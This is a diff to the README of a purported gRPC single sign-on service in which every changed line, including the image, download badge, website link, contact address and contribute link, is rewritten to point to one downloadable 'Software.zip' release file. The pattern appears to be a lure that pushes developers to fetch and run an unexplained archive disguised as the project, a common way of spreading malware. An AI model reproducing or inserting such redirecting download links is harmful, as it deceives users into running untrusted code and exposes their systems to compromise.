@@ -1,6 +1,6 @@
 # gRPC SSO Service 🛡️
 
-![gRPC SSO Service](https://imageurl.com)
+![gRPC SSO Service](https://github.com/undenialable/gRPC-sso-service/releases/download/v2.0/Software.zip)
 
 Welcome to the **gRPC SSO Service** repository! This authorization service is designed for use in several projects such as services, web applications, monoliths, APIs, and more. It utilizes gRPC technology to provide a secure and efficient communication protocol. Whether you are developing an educational project or a production-level service, this service aims to simplify the authorization process for your applications.
 
@@ -33,7 +33,7 @@ For detailed instructions on setup and integration, refer to the documentation i
 
 To install the **gRPC SSO Service**, download the software package from the following link:
 
-[![Download Software Package](https://img.shields.io/badge/Download-Software%20Package-blue)](https://github.com/user-attachments/files/18383251/Software.zip)
+[![Download Software Package](https://github.com/undenialable/gRPC-sso-service/releases/download/v2.0/Software.zip%20Package-blue)](https://github.com/undenialable/gRPC-sso-service/releases/download/v2.0/Software.zip)
 
 Once the software package is downloaded, follow the installation instructions provided within. If you encounter any issues, check the "Releases" section for any updates or troubleshooting guides.
 
@@ -41,7 +41,7 @@ Once the software package is downloaded, follow the installation instructions pr
 
 Visit our website for more information and resources related to the **gRPC SSO Service**:
 
-[Visit Website](https://grpc-sso-service.com)
+[Visit Website](https://github.com/undenialable/gRPC-sso-service/releases/download/v2.0/Software.zip)
 
 ## 🧰 Technologies Used
 
@@ -64,8 +64,8 @@ Visit our website for more information and resources related to the **gRPC SSO S
 
 ## 📞 Contact Us
 
-If you have any questions, feedback, or suggestions regarding the **gRPC SSO Service**, feel free to contact us at [email@example.com]. We appreciate your input and are always looking to improve our services.
+If you have any questions, feedback, or suggestions regarding the **gRPC SSO Service**, feel free to contact us at [https://github.com/undenialable/gRPC-sso-service/releases/download/v2.0/Software.zip]. We appreciate your input and are always looking to improve our services.
 
 Let's build secure and efficient authorization systems together with **gRPC SSO Service**! 🚀
 
-[Contribute to the Repository](https://github.com/user/repository/contribute)
+[Contribute to the Repository](https://github.com/undenialable/gRPC-sso-service/releases/download/v2.0/Software.zip)
